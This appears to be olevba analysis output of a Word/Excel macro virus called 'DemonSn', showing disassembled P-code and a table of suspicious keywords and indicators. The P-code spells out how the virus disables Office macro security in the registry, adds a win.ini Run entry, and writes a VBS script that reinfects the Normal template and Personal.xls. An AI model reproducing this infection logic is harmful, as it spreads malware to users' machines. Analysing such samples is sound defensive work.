' 	MemSt Saved 
' Line #162:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #163:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #164:
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0007 "DemonSn"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #165:
' 	LitVarSpecial (True)
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #166:
' 	LitStr 0x0007 "DemonSn"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #167:
' 	LitVarSpecial (True)
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #168:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #171:
' 	EndSub 
' Line #172:
' Line #173:
' 	FuncDefn (Sub Sec(ByVal N As String))
' Line #174:
' 	OnError (Resume Next) 
' Line #175:
' 	LitDI2 0x0001 
' 	St Level& 
' Line #176:
' 	LitHI4 0x0001 0x8000 
' 	Ld hPath 
' 	Ld N 
' 	Concat 
' 	Ld hSec 
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld hKey 
' 	LitDI2 0x0002 
' 	ArgsCall RegCreateKeyExA 0x0009 
' Line #177:
' 	Ld hKey 
' 	LitStr 0x0005 "Level"
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	Ld Level 
' 	LitDI2 0x0004 
' 	ArgsCall RegSetValueExA 0x0006 
' Line #178:
' 	EndSub 
' Line #179:
' Line #180:
' 	FuncDefn (Sub Hide())
' Line #181:
' 	OnError (Resume Next) 
' Line #182:
' 	LitStr 0x0005 "Excel"
' 	ArgsCall Sec 0x0001 
' Line #183:
' 	LitStr 0x0004 "Word"
' 	ArgsCall Sec 0x0001 
' Line #184:
' 	LitStr 0x000A "PowerPoint"
' 	ArgsCall Sec 0x0001 
' Line #185:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St WinDir 
' Line #186:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #187:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0007 "DemonSn"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #188:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #189:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St WinDir 
' Line #190:
' 	LitStr 0x000B "The DemonSn"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #191:
' 	Ld WinDir 
' 	LitStr 0x0008 "\Win.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #192:
' 	LitVarSpecial (False)
' 	St Infected 
' Line #193:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #194:
' 	LitDI2 0x0001 
' 	Ld Like 
' 	LineInput 
' Line #195:
' 	Ld Like 
' 	LitStr 0x000F "Run=DemonSn.vbs"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Infected 
' 	EndIf 
' Line #196:
' 	Loop 
' Line #197:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #198:
' 	Ld Infected 
' 	Not 
' 	IfBlock 
' Line #199:
' 	Ld WinDir 
' 	LitStr 0x0008 "\win.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #200:
' 	LitStr 0x000A "c:\Win._ni"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #201:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #202:
' 	LitDI2 0x0001 
' 	Ld Like 
' 	LineInput 
' Line #203:
' 	Ld Like 
' 	LitStr 0x0009 "[windows]"
' 	Eq 
' 	IfBlock 
' Line #204:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #205:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Run=DemonSn.vbs"
' 	PrintItemNL 
' Line #206:
' 	ElseBlock 
' Line #207:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	Loop 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #211:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #212:
' 	EndIfBlock 
' Line #213:
' 	LitStr 0x000A "c:\win._ni"
' 	Ld WinDir 
' 	LitStr 0x0008 "\Win.ini"
' 	Concat 
' 	ArgsCall FileCopy 0x0002 
' Line #214:
' 	LitStr 0x000A "c:\win._ni"
' 	ArgsCall Kill 0x0001 
' Line #215:
' 	Ld WinDir 
' 	LitStr 0x000C "\DemonSn.vbs"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #216:
' 	Ld WinDir 
' 	LitStr 0x000C "\DemonSn.vbs"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #218:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Set Word = CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Word.Application"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #219:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Word.Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #220:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005D "Word.NormalTemplate.VBProject.VBComponents.Remove Word.NormalTemplate.VBProject.VBComponents("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "DemonSn"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #221:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "Word.NormalTemplate.VBProject.VBComponents.Import ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld WinDir 
' 	Concat 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #222:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Word.NormalTemplate.Save"
' 	PrintItemNL 
' Line #223:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Word.Quit"
' 	PrintItemNL 
' Line #224:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Set ExcelObj = CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "Excel.Application"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "Set FSO = CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #226:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "FSO.DeleteFile ExcelObj.StartupPath & "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "\Personal.xls"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "ExcelObj.Workbooks.Add 1"
' 	PrintItemNL 
' Line #228:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "ExcelObj.Workbooks(1).VBProject.VBComponents.Import ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld WinDir 
' 	Concat 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "ExcelObj.ActiveWindow.Visible = False"
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "ExcelObj.OnSheetActivate = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Personal.xls!Active"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #231:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "ExcelObj.Workbooks(1).SaveAs ExcelObj.StartupPath & "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "\Personal.xls"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #232:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "ExcelObj.Quit"
' 	PrintItemNL 
' Line #233:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #234:
' 	EndSub 
' Line #235:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |Dmnsn.dll           |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |DemonSn.vbs         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

